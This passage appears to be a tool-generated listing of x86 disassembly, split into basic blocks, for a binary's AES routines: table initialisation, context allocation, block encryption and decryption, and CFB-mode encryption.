0x80543a4:	idiv	ecx
0x80543a6:	mov	al, byte ptr [edx + 0x805c08c]
0x80543ac:	xor	esi, eax
0x80543ae:	xor	eax, eax
0x80543b0:	cmp	byte ptr [esp + 2], 0
0x80543b5:	je	0x80543d0
None
|
|
|
v
0x805433b:	xor	esi, eax
0x805433d:	mov	al, byte ptr [edi + 0xc]
0x8054340:	mov	byte ptr [esp + 3], al
0x8054344:	xor	eax, eax
0x8054346:	cmp	byte ptr [esp + 3], 0
0x805434b:	je	0x8054366
None
|
|
|
v
0x8054421:	movzx	eax, byte ptr [esp + 1]
0x8054426:	movzx	eax, byte ptr [eax + 0x805be8c]
0x805442d:	add	eax, dword ptr [esp + 0x10]
0x8054431:	cdq	
0x8054432:	idiv	ecx
0x8054434:	mov	al, byte ptr [edx + 0x805c08c]
0x805443a:	xor	esi, eax
0x805443c:	xor	eax, eax
0x805443e:	cmp	byte ptr [esp + 2], 0
0x8054443:	je	0x805445e
None
|
|
|
v
0x805448e:	movzx	ebx, bl
0x8054491:	movzx	eax, byte ptr [ebx + 0x805be8c]
0x8054498:	add	eax, dword ptr [esp + 8]
0x805449c:	cdq	
0x805449d:	idiv	ecx
0x805449f:	movzx	esi, byte ptr [edx + 0x805c08c]
0x80544a6:	xor	ebx, ebx
0x80544a8:	cmp	byte ptr [esp + 1], 0
0x80544ad:	je	0x80544c8
None
|
|
|
v
0x8054510:	xor	ebx, eax
0x8054512:	inc	edi
0x8054513:	mov	byte ptr [esp + ebp + 0x20], bl
0x8054517:	inc	ebp
0x8054518:	cmp	ebp, 4
0x805451b:	lea	esi, dword ptr [esp + 0x14]
0x805451f:	jne	0x80542c7
None
|
|
|
v
0x8054482:	xor	eax, esi
0x8054484:	xor	esi, esi
0x8054486:	test	bl, bl
0x8054488:	mov	byte ptr [esp + ebp + 0x1c], al
0x805448c:	je	0x80544a6
None
|
|
|
v
0x805443a:	xor	esi, eax
0x805443c:	xor	eax, eax
0x805443e:	cmp	byte ptr [esp + 2], 0
0x8054443:	je	0x805445e
None
|
|
|
v
0x8054289:	push	ebp
0x805428a:	mov	ecx, 0xff
0x805428f:	push	edi
0x8054290:	xor	ebp, ebp
0x8054292:	push	esi
0x8054293:	push	ebx
0x8054294:	sub	esp, 0x24
0x8054297:	movzx	eax, byte ptr [0x805be9a]
0x805429e:	mov	edi, dword ptr [esp + 0x38]
0x80542a2:	mov	dword ptr [esp + 4], eax
0x80542a6:	movzx	eax, byte ptr [0x805be97]
0x80542ad:	mov	dword ptr [esp + 8], eax
0x80542b1:	movzx	eax, byte ptr [0x805be99]
0x80542b8:	mov	dword ptr [esp + 0xc], eax
0x80542bc:	movzx	eax, byte ptr [0x805be95]
0x80542c3:	mov	dword ptr [esp + 0x10], eax
0x80542c7:	mov	bl, byte ptr [edi]
0x80542c9:	xor	esi, esi
0x80542cb:	test	bl, bl
0x80542cd:	je	0x80542e7
None
|
|
|
v
0x8054372:	movzx	eax, bl
0x8054375:	movzx	eax, byte ptr [eax + 0x805be8c]
0x805437c:	add	eax, dword ptr [esp + 0x10]
0x8054380:	cdq	
0x8054381:	idiv	ecx
0x8054383:	movzx	esi, byte ptr [edx + 0x805c08c]
0x805438a:	xor	eax, eax
0x805438c:	cmp	byte ptr [esp + 1], 0
0x8054391:	je	0x80543ac
None
|
|
|
v
0x8054418:	xor	eax, eax
0x805441a:	cmp	byte ptr [esp + 1], 0
0x805441f:	je	0x805443a
None
|
|
|
v
0x80544a6:	xor	ebx, ebx
0x80544a8:	cmp	byte ptr [esp + 1], 0
0x80544ad:	je	0x80544c8
None
|
|
|
v
0x805452b:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8054322:	movzx	eax, byte ptr [esp + 2]
0x8054327:	movzx	eax, byte ptr [eax + 0x805be8c]
0x805432e:	add	eax, dword ptr [esp + 0xc]
0x8054332:	cdq	
0x8054333:	idiv	ecx
0x8054335:	mov	al, byte ptr [edx + 0x805c08c]
0x805433b:	xor	esi, eax
0x805433d:	mov	al, byte ptr [edi + 0xc]
0x8054340:	mov	byte ptr [esp + 3], al
0x8054344:	xor	eax, eax
0x8054346:	cmp	byte ptr [esp + 3], 0
0x805434b:	je	0x8054366
None
|
|
|
v
0x805445e:	xor	esi, eax
0x8054460:	xor	eax, eax
0x8054462:	cmp	byte ptr [esp + 3], 0
0x8054467:	je	0x8054482
None
|
|
|
v
0x80542cf:	movzx	eax, bl
0x80542d2:	movzx	eax, byte ptr [eax + 0x805be8c]
0x80542d9:	add	eax, dword ptr [esp + 4]
0x80542dd:	cdq	
0x80542de:	idiv	ecx
0x80542e0:	movzx	esi, byte ptr [edx + 0x805c08c]
0x80542e7:	mov	al, byte ptr [edi + 4]
0x80542ea:	mov	byte ptr [esp + 1], al
0x80542ee:	xor	eax, eax
0x80542f0:	cmp	byte ptr [esp + 1], 0
0x80542f5:	je	0x8054310
None
|
|
|
v
0x80544ec:	xor	ebx, esi
0x80544ee:	xor	eax, eax
0x80544f0:	cmp	byte ptr [esp + 3], 0
0x80544f5:	je	0x8054510
None
|
|
|
v
0x8054366:	xor	eax, esi
0x8054368:	xor	esi, esi
0x805436a:	test	bl, bl
0x805436c:	mov	byte ptr [esp + ebp + 0x14], al
0x8054370:	je	0x805438a
None
|
|
|
v
0x80542c7:	mov	bl, byte ptr [edi]
0x80542c9:	xor	esi, esi
0x80542cb:	test	bl, bl
0x80542cd:	je	0x80542e7
None
|
|
|
v
0x8054310:	xor	esi, eax
0x8054312:	mov	al, byte ptr [edi + 8]
0x8054315:	mov	byte ptr [esp + 2], al
0x8054319:	xor	eax, eax
0x805431b:	cmp	byte ptr [esp + 2], 0
0x8054320:	je	0x805433b
None
|
|
|
v
0x805438a:	xor	eax, eax
0x805438c:	cmp	byte ptr [esp + 1], 0
0x8054391:	je	0x80543ac
None
|
|
|
v
0x8054400:	movzx	eax, bl
0x8054403:	movzx	eax, byte ptr [eax + 0x805be8c]
0x805440a:	add	eax, dword ptr [esp + 0xc]
0x805440e:	cdq	
0x805440f:	idiv	ecx
0x8054411:	movzx	esi, byte ptr [edx + 0x805c08c]
0x8054418:	xor	eax, eax
0x805441a:	cmp	byte ptr [esp + 1], 0
0x805441f:	je	0x805443a
None
|
|
|
v
0x805452d:	add	esp, 0x24
0x8054530:	pop	ebx
0x8054531:	pop	esi
0x8054532:	pop	edi
0x8054533:	pop	ebp
0x8054534:	ret	
None
|
|
|
v
0x805434d:	movzx	eax, byte ptr [esp + 3]
0x8054352:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054359:	add	eax, dword ptr [esp + 0x10]
0x805435d:	cdq	
0x805435e:	idiv	ecx
0x8054360:	mov	al, byte ptr [edx + 0x805c08c]
0x8054366:	xor	eax, esi
0x8054368:	xor	esi, esi
0x805436a:	test	bl, bl
0x805436c:	mov	byte ptr [esp + ebp + 0x14], al
0x8054370:	je	0x805438a
None
|
|
|
v
0x80543db:	movzx	eax, byte ptr [esp + 3]
0x80543e0:	movzx	eax, byte ptr [eax + 0x805be8c]
0x80543e7:	add	eax, dword ptr [esp + 0xc]
0x80543eb:	cdq	
0x80543ec:	idiv	ecx
0x80543ee:	mov	al, byte ptr [edx + 0x805c08c]
0x80543f4:	xor	eax, esi
0x80543f6:	xor	esi, esi
0x80543f8:	test	bl, bl
0x80543fa:	mov	byte ptr [esp + ebp + 0x18], al
0x80543fe:	je	0x8054418
None
|
|
|
v
0x8054469:	movzx	eax, byte ptr [esp + 3]
0x805446e:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054475:	add	eax, dword ptr [esp + 8]
0x8054479:	cdq	
0x805447a:	idiv	ecx
0x805447c:	mov	al, byte ptr [edx + 0x805c08c]
0x8054482:	xor	eax, esi
0x8054484:	xor	esi, esi
0x8054486:	test	bl, bl
0x8054488:	mov	byte ptr [esp + ebp + 0x1c], al
0x805448c:	je	0x80544a6
None
|
|
|
v
0x8054445:	movzx	eax, byte ptr [esp + 2]
0x805444a:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054451:	add	eax, dword ptr [esp + 4]
0x8054455:	cdq	
0x8054456:	idiv	ecx
0x8054458:	mov	al, byte ptr [edx + 0x805c08c]
0x805445e:	xor	esi, eax
0x8054460:	xor	eax, eax
0x8054462:	cmp	byte ptr [esp + 3], 0
0x8054467:	je	0x8054482
None
|
|
|
v
0x80542f7:	movzx	eax, byte ptr [esp + 1]
0x80542fc:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054303:	add	eax, dword ptr [esp + 8]
0x8054307:	cdq	
0x8054308:	idiv	ecx
0x805430a:	mov	al, byte ptr [edx + 0x805c08c]
0x8054310:	xor	esi, eax
0x8054312:	mov	al, byte ptr [edi + 8]
0x8054315:	mov	byte ptr [esp + 2], al
0x8054319:	xor	eax, eax
0x805431b:	cmp	byte ptr [esp + 2], 0
0x8054320:	je	0x805433b
None
|
|
|
v
0x80544d3:	movzx	eax, byte ptr [esp + 2]
0x80544d8:	movzx	eax, byte ptr [eax + 0x805be8c]
0x80544df:	add	eax, dword ptr [esp + 0x10]
0x80544e3:	cdq	
0x80544e4:	idiv	ecx
0x80544e6:	mov	bl, byte ptr [edx + 0x805c08c]
0x80544ec:	xor	ebx, esi
0x80544ee:	xor	eax, eax
0x80544f0:	cmp	byte ptr [esp + 3], 0
0x80544f5:	je	0x8054510
None
|
|
|
v
0x80544f7:	movzx	eax, byte ptr [esp + 3]
0x80544fc:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054503:	add	eax, dword ptr [esp + 4]
0x8054507:	cdq	
0x8054508:	idiv	ecx
0x805450a:	mov	al, byte ptr [edx + 0x805c08c]
0x8054510:	xor	ebx, eax
0x8054512:	inc	edi
0x8054513:	mov	byte ptr [esp + ebp + 0x20], bl
0x8054517:	inc	ebp
0x8054518:	cmp	ebp, 4
0x805451b:	lea	esi, dword ptr [esp + 0x14]
0x805451f:	jne	0x80542c7
None
|
|
|
v
0x80542e7:	mov	al, byte ptr [edi + 4]
0x80542ea:	mov	byte ptr [esp + 1], al
0x80542ee:	xor	eax, eax
0x80542f0:	cmp	byte ptr [esp + 1], 0
0x80542f5:	je	0x8054310
None
|
|
|
v
0x8054525:	mov	edi, dword ptr [esp + 0x38]
0x8054529:	mov	ecx, ebp
0x805452b:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x80543ac:	xor	esi, eax
0x80543ae:	xor	eax, eax
0x80543b0:	cmp	byte ptr [esp + 2], 0
0x80543b5:	je	0x80543d0
None
|
|
|
v
0x80544af:	movzx	eax, byte ptr [esp + 1]
0x80544b4:	movzx	eax, byte ptr [eax + 0x805be8c]
0x80544bb:	add	eax, dword ptr [esp + 0xc]
0x80544bf:	cdq	
0x80544c0:	idiv	ecx
0x80544c2:	mov	bl, byte ptr [edx + 0x805c08c]
0x80544c8:	xor	esi, ebx
0x80544ca:	xor	ebx, ebx
0x80544cc:	cmp	byte ptr [esp + 2], 0
0x80544d1:	je	0x80544ec
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:InitAESTables
TOTAL BLOCKS :9
0x805455f:	xor	edx, edx
0x8054561:	xor	ebx, ebx
0x8054563:	jmp	0x8054579
None
|
|
|
v
0x8054565:	movzx	eax, byte ptr [edx + 0x805be8c]
0x805456c:	mov	ecx, 0xff
0x8054571:	sub	ecx, eax
0x8054573:	mov	bl, byte ptr [ecx + 0x805c08c]
0x8054579:	mov	byte ptr [edx + 0x805c18c], 0
0x8054580:	xor	esi, esi
0x8054582:	xor	eax, eax
0x8054584:	movzx	ebx, bl
0x8054587:	mov	edi, ebx
0x8054589:	mov	cl, al
0x805458b:	xor	edi, 0x63
0x805458e:	mov	ebp, ebx
0x8054590:	sar	edi, cl
0x8054592:	lea	ecx, dword ptr [eax + 4]
0x8054595:	and	ecx, 7
0x8054598:	sar	ebp, cl
0x805459a:	lea	ecx, dword ptr [eax + 5]
0x805459d:	xor	ebp, edi
0x805459f:	and	ecx, 7
0x80545a2:	mov	edi, ebx
0x80545a4:	sar	edi, cl
0x80545a6:	lea	ecx, dword ptr [eax + 6]
0x80545a9:	xor	edi, ebp
0x80545ab:	and	ecx, 7
0x80545ae:	mov	ebp, ebx
0x80545b0:	sar	ebp, cl
0x80545b2:	lea	ecx, dword ptr [eax + 7]
0x80545b5:	xor	ebp, edi
0x80545b7:	and	ecx, 7
0x80545ba:	mov	edi, ebx
0x80545bc:	sar	edi, cl
0x80545be:	mov	cl, al
0x80545c0:	xor	edi, ebp
0x80545c2:	inc	eax
0x80545c3:	and	edi, 1
0x80545c6:	shl	edi, cl
0x80545c8:	or	esi, edi
0x80545ca:	cmp	eax, 8
0x80545cd:	jne	0x8054587
None
|
|
|
v
0x8054535:	push	ebp
0x8054536:	mov	al, 1
0x8054538:	push	edi
0x8054539:	push	esi
0x805453a:	push	ebx
0x805453b:	xor	ebx, ebx
0x805453d:	push	3
0x805453f:	movzx	edx, al
0x8054542:	push	edx
0x8054543:	mov	byte ptr [edx + 0x805be8c], bl
0x8054549:	mov	byte ptr [ebx + 0x805c08c], al
0x805454f:	inc	ebx
0x8054550:	call	0x8053e68
None
|
|
|
v
0x8054587:	mov	edi, ebx
0x8054589:	mov	cl, al
0x805458b:	xor	edi, 0x63
0x805458e:	mov	ebp, ebx
0x8054590:	sar	edi, cl
0x8054592:	lea	ecx, dword ptr [eax + 4]
0x8054595:	and	ecx, 7
0x8054598:	sar	ebp, cl
0x805459a:	lea	ecx, dword ptr [eax + 5]
0x805459d:	xor	ebp, edi
0x805459f:	and	ecx, 7
0x80545a2:	mov	edi, ebx
0x80545a4:	sar	edi, cl
0x80545a6:	lea	ecx, dword ptr [eax + 6]
0x80545a9:	xor	edi, ebp
0x80545ab:	and	ecx, 7
0x80545ae:	mov	ebp, ebx
0x80545b0:	sar	ebp, cl
0x80545b2:	lea	ecx, dword ptr [eax + 7]
0x80545b5:	xor	ebp, edi
0x80545b7:	and	ecx, 7
0x80545ba:	mov	edi, ebx
0x80545bc:	sar	edi, cl
0x80545be:	mov	cl, al
0x80545c0:	xor	edi, ebp
0x80545c2:	inc	eax
0x80545c3:	and	edi, 1
0x80545c6:	shl	edi, cl
0x80545c8:	or	esi, edi
0x80545ca:	cmp	eax, 8
0x80545cd:	jne	0x8054587
None
|
|
|
v
0x80545cf:	mov	eax, esi
0x80545d1:	and	esi, 0xff
0x80545d7:	mov	byte ptr [edx + 0x805c18c], al
0x80545dd:	mov	byte ptr [esi + 0x805bf8c], dl
0x80545e3:	inc	edx
0x80545e4:	cmp	edx, 0x100
0x80545ea:	jne	0x8054565
None
|
|
|
v
0x8054555:	cmp	ebx, 0xff
0x805455b:	pop	esi
0x805455c:	pop	edi
0x805455d:	jne	0x805453d
None
|
|
|
v
0x80545f0:	pop	ebx
0x80545f1:	mov	byte ptr [0x805c18d], 0x7c
0x80545f8:	pop	esi
0x80545f9:	mov	byte ptr [0x805c008], 1
0x8054600:	pop	edi
0x8054601:	mov	byte ptr [0x805bfef], 0
0x8054608:	pop	ebp
0x8054609:	ret	
None
|
|
|
v
0x805453d:	push	3
0x805453f:	movzx	edx, al
0x8054542:	push	edx
0x8054543:	mov	byte ptr [edx + 0x805be8c], bl
0x8054549:	mov	byte ptr [ebx + 0x805c08c], al
0x805454f:	inc	ebx
0x8054550:	call	0x8053e68
None
|
|
|
v
0x8054579:	mov	byte ptr [edx + 0x805c18c], 0
0x8054580:	xor	esi, esi
0x8054582:	xor	eax, eax
0x8054584:	movzx	ebx, bl
0x8054587:	mov	edi, ebx
0x8054589:	mov	cl, al
0x805458b:	xor	edi, 0x63
0x805458e:	mov	ebp, ebx
0x8054590:	sar	edi, cl
0x8054592:	lea	ecx, dword ptr [eax + 4]
0x8054595:	and	ecx, 7
0x8054598:	sar	ebp, cl
0x805459a:	lea	ecx, dword ptr [eax + 5]
0x805459d:	xor	ebp, edi
0x805459f:	and	ecx, 7
0x80545a2:	mov	edi, ebx
0x80545a4:	sar	edi, cl
0x80545a6:	lea	ecx, dword ptr [eax + 6]
0x80545a9:	xor	edi, ebp
0x80545ab:	and	ecx, 7
0x80545ae:	mov	ebp, ebx
0x80545b0:	sar	ebp, cl
0x80545b2:	lea	ecx, dword ptr [eax + 7]
0x80545b5:	xor	ebp, edi
0x80545b7:	and	ecx, 7
0x80545ba:	mov	edi, ebx
0x80545bc:	sar	edi, cl
0x80545be:	mov	cl, al
0x80545c0:	xor	edi, ebp
0x80545c2:	inc	eax
0x80545c3:	and	edi, 1
0x80545c6:	shl	edi, cl
0x80545c8:	or	esi, edi
0x80545ca:	cmp	eax, 8
0x80545cd:	jne	0x8054587
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:AESAllocateContext
TOTAL BLOCKS :9
0x8054664:	push	ebx
0x8054665:	call	0x8053ef2
None
|
|
|
v
0x805464f:	mov	dword ptr [eax + 0x14], edi
0x8054652:	mov	eax, ecx
0x8054654:	sub	esp, 0xc
0x8054657:	shr	eax, 2
0x805465a:	mov	dword ptr [ebx + 0x10], eax
0x805465d:	lea	eax, dword ptr [ebx + 0x18]
0x8054660:	mov	edi, eax
0x8054662:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x8054622:	movzx	edi, byte ptr [ecx + 0x805661c]
0x8054629:	test	edi, edi
0x805462b:	je	0x805466d
None
|
|
|
v
0x805466a:	add	esp, 0x10
0x805466d:	add	esp, 0x10
0x8054670:	mov	eax, ebx
0x8054672:	pop	ebx
0x8054673:	pop	esi
0x8054674:	pop	edi
0x8054675:	ret	
None
|
|
|
v
0x805460a:	push	edi
0x805460b:	push	esi
0x805460c:	push	ebx
0x805460d:	xor	ebx, ebx
0x805460f:	sub	esp, 0x10
0x8054612:	mov	ecx, dword ptr [esp + 0x24]
0x8054616:	mov	esi, dword ptr [esp + 0x20]
0x805461a:	lea	eax, dword ptr [ecx - 0x10]
0x805461d:	cmp	eax, 0x10
0x8054620:	ja	0x805466d
None
|
|
|
v
0x8054642:	add	esp, 0x10
0x8054645:	mov	ecx, dword ptr [esp + 0xc]
0x8054649:	test	eax, eax
0x805464b:	mov	ebx, eax
0x805464d:	je	0x805466d
None
|
|
|
v
0x8054662:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x805466d:	add	esp, 0x10
0x8054670:	mov	eax, ebx
0x8054672:	pop	ebx
0x8054673:	pop	esi
0x8054674:	pop	edi
0x8054675:	ret	
None
|
|
|
v
0x805462d:	mov	eax, edi
0x805462f:	sub	esp, 0xc
0x8054632:	shl	eax, 4
0x8054635:	add	eax, 0x28
0x8054638:	push	eax
0x8054639:	mov	dword ptr [esp + 0x1c], ecx
0x805463d:	call	0x804bd40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:AESBlockEncrypt
TOTAL BLOCKS :16
0x80546bf:	push	ebx
0x80546c0:	call	0x8053ffa
None
|
|
|
v
0x80546ea:	add	esp, 0x10
0x80546ed:	xor	eax, eax
0x80546ef:	mov	edx, eax
0x80546f1:	mov	ecx, eax
0x80546f3:	shr	edx, 2
0x80546f6:	and	ecx, 3
0x80546f9:	lea	edx, dword ptr [edx + ecx*4]
0x80546fc:	mov	dl, byte ptr [ebx + edx]
0x80546ff:	mov	byte ptr [edi + eax], dl
0x8054702:	inc	eax
0x8054703:	cmp	eax, 0x10
0x8054706:	jne	0x80546ef
None
|
|
|
v
0x80546d0:	cmp	esi, dword ptr [ebx + 0x14]
0x80546d3:	jb	0x80546b3
None
|
|
|
v
0x80546b3:	push	ebx
0x80546b4:	call	0x8053f88
None
|
|
|
v
0x80546ef:	mov	edx, eax
0x80546f1:	mov	ecx, eax
0x80546f3:	shr	edx, 2
0x80546f6:	and	ecx, 3
0x80546f9:	lea	edx, dword ptr [edx + ecx*4]
0x80546fc:	mov	dl, byte ptr [ebx + edx]
0x80546ff:	mov	byte ptr [edi + eax], dl
0x8054702:	inc	eax
0x8054703:	cmp	eax, 0x10
0x8054706:	jne	0x80546ef
None
|
|
|
v
0x8054676:	push	ebp
0x8054677:	xor	eax, eax
0x8054679:	push	edi
0x805467a:	push	esi
0x805467b:	push	ebx
0x805467c:	mov	ebx, dword ptr [esp + 0x14]
0x8054680:	mov	ebp, dword ptr [esp + 0x18]
0x8054684:	mov	edi, dword ptr [esp + 0x1c]
0x8054688:	mov	dl, byte ptr [ebp + eax]
0x805468c:	mov	ecx, eax
0x805468e:	mov	esi, eax
0x8054690:	shr	ecx, 2
0x8054693:	and	esi, 3
0x8054696:	inc	eax
0x8054697:	lea	ecx, dword ptr [ecx + esi*4]
0x805469a:	cmp	eax, 0x10
0x805469d:	mov	byte ptr [ebx + ecx], dl
0x80546a0:	jne	0x8054688
None
|
|
|
v
0x80546b9:	push	ebx
0x80546ba:	call	0x8053fb1
None
|
|
|
v
0x80546db:	push	ebx
0x80546dc:	call	0x8053fb1
None
|
|
|
v
0x80546d5:	push	ebx
0x80546d6:	call	0x8053f88
None
|
|
|
v
0x80546a2:	push	0
0x80546a4:	mov	esi, 1
0x80546a9:	push	ebx
0x80546aa:	call	0x80541d4
None
|
|
|
v
0x80546e1:	push	dword ptr [ebx + 0x14]
0x80546e4:	push	ebx
0x80546e5:	call	0x80541d4
None
|
|
|
v
0x80546cd:	add	esp, 0x14
0x80546d0:	cmp	esi, dword ptr [ebx + 0x14]
0x80546d3:	jb	0x80546b3
None
|
|
|
v
0x80546af:	pop	ebp
0x80546b0:	pop	eax
0x80546b1:	jmp	0x80546d0
None
|
|
|
v
0x8054708:	pop	ebx
0x8054709:	pop	esi
0x805470a:	pop	edi
0x805470b:	pop	ebp
0x805470c:	ret	
None
|
|
|
v
0x8054688:	mov	dl, byte ptr [ebp + eax]
0x805468c:	mov	ecx, eax
0x805468e:	mov	esi, eax
0x8054690:	shr	ecx, 2
0x8054693:	and	esi, 3
0x8054696:	inc	eax
0x8054697:	lea	ecx, dword ptr [ecx + esi*4]
0x805469a:	cmp	eax, 0x10
0x805469d:	mov	byte ptr [ebx + ecx], dl
0x80546a0:	jne	0x8054688
None
|
|
|
v
0x80546c5:	push	esi
0x80546c6:	inc	esi
0x80546c7:	push	ebx
0x80546c8:	call	0x80541d4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:AESBlockDecrypt
TOTAL BLOCKS :16
0x8054750:	push	ebx
0x8054751:	call	0x8054260
None
|
|
|
v
0x805470d:	push	ebp
0x805470e:	xor	eax, eax
0x8054710:	push	edi
0x8054711:	push	esi
0x8054712:	push	ebx
0x8054713:	mov	ebx, dword ptr [esp + 0x14]
0x8054717:	mov	ebp, dword ptr [esp + 0x18]
0x805471b:	mov	edi, dword ptr [esp + 0x1c]
0x805471f:	mov	dl, byte ptr [ebp + eax]
0x8054723:	mov	ecx, eax
0x8054725:	mov	esi, eax
0x8054727:	sar	ecx, 2
0x805472a:	and	esi, 3
0x805472d:	inc	eax
0x805472e:	lea	ecx, dword ptr [ecx + esi*4]
0x8054731:	cmp	eax, 0x10
0x8054734:	mov	byte ptr [ebx + ecx], dl
0x8054737:	jne	0x805471f
None
|
|
|
v
0x8054771:	push	ebx
0x8054772:	call	0x8054260
None
|
|
|
v
0x8054742:	mov	esi, dword ptr [ebx + 0x14]
0x8054745:	pop	eax
0x8054746:	pop	edx
0x8054747:	dec	esi
0x8054748:	jmp	0x8054767
None
|
|
|
v
0x805474a:	push	ebx
0x805474b:	call	0x8054218
None
|
|
|
v
0x8054777:	push	0
0x8054779:	push	ebx
0x805477a:	call	0x80541d4
None
|
|
|
v
0x8054764:	add	esp, 0x14
0x8054767:	test	esi, esi
0x8054769:	jg	0x805474a
None
|
|
|
v
0x805471f:	mov	dl, byte ptr [ebp + eax]
0x8054723:	mov	ecx, eax
0x8054725:	mov	esi, eax
0x8054727:	sar	ecx, 2
0x805472a:	and	esi, 3
0x805472d:	inc	eax
0x805472e:	lea	ecx, dword ptr [ecx + esi*4]
0x8054731:	cmp	eax, 0x10
0x8054734:	mov	byte ptr [ebx + ecx], dl
0x8054737:	jne	0x805471f
None
|
|
|
v
0x805479d:	pop	ebx
0x805479e:	pop	esi
0x805479f:	pop	edi
0x80547a0:	pop	ebp
0x80547a1:	ret	
None
|
|
|
v
0x8054767:	test	esi, esi
0x8054769:	jg	0x805474a
None
|
|
|
v
0x8054784:	mov	edx, eax
0x8054786:	mov	ecx, eax
0x8054788:	sar	edx, 2
0x805478b:	and	ecx, 3
0x805478e:	lea	edx, dword ptr [edx + ecx*4]
0x8054791:	mov	dl, byte ptr [ebx + edx]
0x8054794:	mov	byte ptr [edi + eax], dl
0x8054797:	inc	eax
0x8054798:	cmp	eax, 0x10
0x805479b:	jne	0x8054784
None
|
|
|
v
0x8054756:	push	esi
0x8054757:	dec	esi
0x8054758:	push	ebx
0x8054759:	call	0x80541d4
None
|
|
|
v
0x805477f:	add	esp, 0x10
0x8054782:	xor	eax, eax
0x8054784:	mov	edx, eax
0x8054786:	mov	ecx, eax
0x8054788:	sar	edx, 2
0x805478b:	and	ecx, 3
0x805478e:	lea	edx, dword ptr [edx + ecx*4]
0x8054791:	mov	dl, byte ptr [ebx + edx]
0x8054794:	mov	byte ptr [edi + eax], dl
0x8054797:	inc	eax
0x8054798:	cmp	eax, 0x10
0x805479b:	jne	0x8054784
None
|
|
|
v
0x8054739:	push	dword ptr [ebx + 0x14]
0x805473c:	push	ebx
0x805473d:	call	0x80541d4
None
|
|
|
v
0x805476b:	push	ebx
0x805476c:	call	0x8054218
None
|
|
|
v
0x805475e:	push	ebx
0x805475f:	call	0x8054289
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:AESCryptCFB
TOTAL BLOCKS :21
0x80547e2:	cmp	byte ptr [esp + 7], 2
0x80547e7:	jne	0x805485d
None
|
|
|
v
0x8054826:	test	esi, esi
0x8054828:	jne	0x805483f
None
|
|
|
v
0x8054820:	test	edx, edx
0x8054822:	jne	0x80547eb
None
|
|
|
v
0x80547ce:	cmp	byte ptr [esp + 7], 1
0x80547d3:	mov	ecx, 4
0x80547d8:	lea	eax, dword ptr [esp + 8]
0x80547dc:	mov	edi, eax
0x80547de:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x805485f:	add	esp, 0x18
0x8054862:	pop	ebx
0x8054863:	pop	esi
0x8054864:	pop	edi
0x8054865:	pop	ebp
0x8054866:	ret	
None
|
|
|
v
0x8054859:	test	edx, edx
0x805485b:	jne	0x8054826
None
|
|
|
v
0x80547e9:	jmp	0x805481c
None
|
|
|
v
0x80547fe:	add	esp, 0xc
0x8054801:	mov	edx, dword ptr [esp]
0x8054804:	mov	al, byte ptr [ebp]
0x8054807:	dec	edx
0x8054808:	inc	ebp
0x8054809:	mov	cl, al
0x805480b:	xor	cl, byte ptr [esp + esi + 8]
0x805480f:	mov	byte ptr [esp + esi + 8], al
0x8054813:	inc	esi
0x8054814:	and	esi, 0xf
0x8054817:	mov	byte ptr [ebx], cl
0x8054819:	inc	ebx
0x805481a:	jmp	0x8054820
None
|
|
|
v
0x80547de:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x805485d:	mov	al, 1
0x805485f:	add	esp, 0x18
0x8054862:	pop	ebx
0x8054863:	pop	esi
0x8054864:	pop	edi
0x8054865:	pop	ebp
0x8054866:	ret	
None
|
|
|
v
0x8054855:	xor	esi, esi
0x8054857:	mov	edi, eax
0x8054859:	test	edx, edx
0x805485b:	jne	0x8054826
None
|
|
|
v
0x805481c:	xor	esi, esi
0x805481e:	mov	edi, eax
0x8054820:	test	edx, edx
0x8054822:	jne	0x80547eb
None
|
|
|
v
0x805482a:	push	edi
0x805482b:	push	edi
0x805482c:	push	dword ptr [esp + 0x34]
0x8054830:	mov	dword ptr [esp + 0xc], edx
0x8054834:	call	0x8054676
None
|
|
|
v
0x80547ef:	push	edi
0x80547f0:	push	edi
0x80547f1:	push	dword ptr [esp + 0x34]
0x80547f5:	mov	dword ptr [esp + 0xc], edx
0x80547f9:	call	0x8054676
None
|
|
|
v
0x805483f:	mov	al, byte ptr [esp + esi + 8]
0x8054843:	dec	edx
0x8054844:	xor	al, byte ptr [ebp]
0x8054847:	inc	ebp
0x8054848:	mov	byte ptr [esp + esi + 8], al
0x805484c:	inc	esi
0x805484d:	mov	byte ptr [ebx], al
0x805484f:	and	esi, 0xf
0x8054852:	inc	ebx
0x8054853:	jmp	0x8054859
None
|
|
|
v
0x80547a2:	push	ebp
0x80547a3:	push	edi
0x80547a4:	push	esi
0x80547a5:	push	ebx
0x80547a6:	sub	esp, 0x18
0x80547a9:	mov	al, byte ptr [esp + 0x30]
0x80547ad:	mov	edx, dword ptr [esp + 0x34]
0x80547b1:	mov	esi, dword ptr [esp + 0x38]
0x80547b5:	mov	ebp, dword ptr [esp + 0x3c]
0x80547b9:	mov	byte ptr [esp + 7], al
0x80547bd:	xor	eax, eax
0x80547bf:	mov	ebx, dword ptr [esp + 0x40]
0x80547c3:	cmp	dword ptr [esp + 0x2c], 0
0x80547c8:	je	0x805485f
None
|
|
|
v
0x8054804:	mov	al, byte ptr [ebp]
0x8054807:	dec	edx
0x8054808:	inc	ebp
0x8054809:	mov	cl, al
0x805480b:	xor	cl, byte ptr [esp + esi + 8]
0x805480f:	mov	byte ptr [esp + esi + 8], al
0x8054813:	inc	esi
0x8054814:	and	esi, 0xf
0x8054817:	mov	byte ptr [ebx], cl
0x8054819:	inc	ebx
0x805481a:	jmp	0x8054820
None
|
|
|
v
0x80547eb:	test	esi, esi
0x80547ed:	jne	0x8054804
None
|
|
|
v
0x8054824:	jmp	0x805485d
None
|
|
|
